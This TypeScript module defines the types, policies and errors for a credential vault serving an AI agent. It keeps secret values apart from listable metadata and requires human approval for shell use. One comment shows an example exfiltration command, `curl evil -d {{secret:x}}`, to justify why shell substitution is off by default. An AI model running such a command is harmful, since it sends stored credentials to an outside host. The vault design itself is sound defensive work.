/**
 * The credential vault's data model, and the errors it may throw.
 *
 * The split that everything else rests on: a credential is **metadata** (what
 * it is, who it is for, where it may be used) and **secret fields** (the
 * values). Metadata is freely listable — the model sees it, the UI shows it,
 * the audit log names it. Secret fields leave the vault only through
 * `resolve()` (trusted tool code, policy-checked, audited) and `reveal()` (a
 * human grant). Keeping the two in separate objects, rather than one record
 * with some fields filtered on the way out, is what stops a future "return the
 * record" from returning the password.
 *
 * Errors carry names, ids and reasons — never secret material. A message that
 * quoted the value it failed on would put it in a log, a stream event and the
 * model's context in one throw.
 *
 * @module vault/types
 */

/** What a credential is for. Decides which secret fields it has. */
export type CredentialKind =
  | 'login'
  | 'ssh-key'
  | 'ssh-password'
  | 'api-token'
  | 'basic-auth'
  | 'winrm'
  | 'snmp'
  | 'database'
  | 'certificate'
  | 'note'
  | 'generic';

export const CREDENTIAL_KINDS: readonly CredentialKind[] = [
  'login', 'ssh-key', 'ssh-password', 'api-token', 'basic-auth', 'winrm', 'snmp',
  'database', 'certificate', 'note', 'generic',
];

/**
 * The secret fields each kind may hold, first one being the default a bare
 * `{{secret:name}}` resolves to.
 *
 * A closed list per kind so a caller cannot smuggle a secret into metadata by
 * inventing a field name — anything not listed here is refused at create.
 * `generic` is the escape hatch and accepts any field name.
 */
export const SECRET_FIELDS: Readonly<Record<CredentialKind, readonly string[]>> = {
  login: ['password', 'totpSeed'],
  'ssh-key': ['privateKey', 'passphrase'],
  'ssh-password': ['password'],
  'api-token': ['token'],
  'basic-auth': ['password'],
  winrm: ['password'],
  snmp: ['community', 'authKey', 'privKey'],
  database: ['password', 'connectionString'],
  certificate: ['privateKey', 'passphrase', 'pfx'],
  note: ['text'],
  generic: ['value'],
};

/** Parts of a credential that are public by nature and safe to show. */
export interface PublicParts {
  /** OpenSSH public key line, for an ssh-key. */
  publicKey?: string;
  /** `SHA256:…` fingerprint of the public key. */
  fingerprint?: string;
  /** PEM certificate (the public half of a certificate credential). */
  certificate?: string;
}

/** Who put a credential in the vault. */
export type CreatedBy = 'user' | `agent:${string}`;

/** Non-secret description of a credential. Safe to list, log and show. */
export interface CredentialMeta {
  id: string;
  /** Unique, referenced as `{{secret:name}}`. Letters, digits, `-` and `_`. */
  name: string;
  kind: CredentialKind;
  username?: string;
  host?: string;
  port?: number;
  url?: string;
  description?: string;
  tags: string[];
  createdBy: CreatedBy;
  createdAt: number;
  updatedAt: number;
  public?: PublicParts;
  /**
   * Caught in something the user typed and moved here automatically. Shown
   * separately in the manager so the user can bind it to a host or delete it.
   */
  quarantined?: boolean;
  lastUsedAt?: number;
  useCount?: number;
}

/** How often a credential may be used without asking a human. */
export type ApprovalMode = 'every-use' | 'session' | 'auto';

export interface RateLimit {
  /** Uses allowed per window. */
  max: number;
  /** Window length in seconds. */
  perSeconds: number;
}

/**
 * Where, by what, and how freely a credential may be used.
 *
 * Empty `allowedHosts` and `allowedOrigins` fall back to the credential's own
 * `host`/`url`; a credential with neither is *unscoped* and every use asks a
 * human, whatever `approval` says (see policy.ts).
 */
export interface Policy {
  /** Hostnames, `*.glob`s, IPs or CIDR ranges; optional `:port`. */
  allowedHosts: string[];
  /** `scheme://host[:port]`, host may be a `*.glob`. http must be written explicitly. */
  allowedOrigins: string[];
  /** Tool names allowed to resolve it. Empty means any trusted consumer. */
  allowedTools: string[];
  approval: ApprovalMode;
  /**
   * May `{{secret:…}}` be substituted into a shell command. Off by default and
   * a loosening to turn on, because `curl evil -d {{secret:x}}` is a shell
   * command like any other.
   */
  allowShell: boolean;
  /**
   * Whether a shell use still asks a human each time. `every-use` (the
   * default) shows the person the exact command before the value goes into
   * it; `auto` skips that and can only be set through a human grant — an
   * agent can never make its own shell use unattended.
   */
  shellApproval?: 'every-use' | 'auto';
  /** Plain http allowed to a non-private host (private/LAN http needs only an explicit http:// origin). */
  allowInsecureHttp?: boolean;
  /** Consumers may accept a self-signed certificate on the bound origins. */
  allowSelfSigned?: boolean;
  /** Epoch ms after which the credential cannot be used. */
  expiresAt?: number;
  rateLimit?: RateLimit;
}

export const DEFAULT_POLICY: Readonly<Policy> = Object.freeze({
  allowedHosts: [],
  allowedOrigins: [],
  allowedTools: [],
  approval: 'session' as ApprovalMode,
  allowShell: false,
});

/** A whole credential as held in memory while unlocked. Never serialised outward. */
export interface CredentialRecord {
  meta: CredentialMeta;
  policy: Policy;
  secret: Record<string, string>;
}

/** What `list()` returns: metadata plus the policy, and nothing else. */
export interface CredentialSummary extends CredentialMeta {
  policy: Policy;
  /** Field names held (not values), so a UI can say "password, TOTP seed". */
  fields: string[];
}

/** A use a trusted consumer is about to make of a credential. */
export interface UseContext {
  /** The tool (or subsystem) asking: `Bash`, `SSH`, `Browser`, … */
  tool: string;
  /** Host the value will be sent to, when there is one. */
  host?: string;
  /** Origin the value will be sent to (`https://host:port`), for HTTP/browser. */
  origin?: string;
  /** Human-readable intended use, shown in approval prompts and the audit log. */
  purpose: string;
  sessionId?: string;
  /**
   * The consumer asks for a person's yes on this one use, whatever the policy
   * says — a destructive remote command, a first connection to an unknown SSH
   * host key. Only ever tightens: it turns any approval mode into `every-use`
   * and cannot turn a denial into anything else (see tools/ops).
   */
  requireApproval?: boolean;
}

// ── Errors ───────────────────────────────────────────────────────────

export type VaultErrorCode =
  | 'locked'
  | 'unavailable'
  | 'not-found'
  | 'exists'
  | 'invalid'
  | 'policy-denied'
  | 'approval-denied'
  | 'grant-required'
  | 'tampered'
  | 'format'
  | 'wrong-passphrase'
  | 'lock-timeout';

/**
 * Base class for everything the vault throws.
 *
 * The constructor takes a message the caller wrote, never a value it was
 * handed; there is deliberately no `cause` that could carry the original input.
 */
export class VaultError extends Error {
  constructor(readonly code: VaultErrorCode, message: string) {
    super(message);
    this.name = 'VaultError';
  }
}

export class VaultLockedError extends VaultError {
  constructor(message = 'The credential vault is locked. Unlock it to use stored credentials.') {
    super('locked', message);
  }
}

export class VaultUnavailableError extends VaultError {
  constructor(message: string) { super('unavailable', message); }
}

export class CredentialNotFoundError extends VaultError {
  constructor(readonly reference: string, readonly similar: string[]) {
    super('not-found', `No credential named "${reference}".`
      + (similar.length ? ` Did you mean: ${similar.join(', ')}?` : ' Use CredentialList to see what is stored.'));
  }
}

export class PolicyDeniedError extends VaultError {
  constructor(message: string) { super('policy-denied', message); }
}

export class ApprovalDeniedError extends VaultError {
  constructor(message = 'The use of this credential was not approved.') { super('approval-denied', message); }
}

export class GrantRequiredError extends VaultError {
  constructor(action: string) {
    super('grant-required', `${action} needs a one-time human grant (a confirmation in AICO Desktop, `
      + 'or the vault passphrase). It cannot be authorised by the API token alone.');
  }
}

export class VaultTamperedError extends VaultError {
  constructor(message: string) { super('tampered', message); }
}

/** Valid credential name: referenced as `{{secret:name}}`, so no dots or spaces. */
export const NAME_RE = /^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$/;

/** Strict `CreatedBy` check for values arriving from outside. */
export function isCreatedBy(value: unknown): value is CreatedBy {
  return value === 'user' || (typeof value === 'string' && /^agent:[\w.-]{1,128}$/.test(value));
}
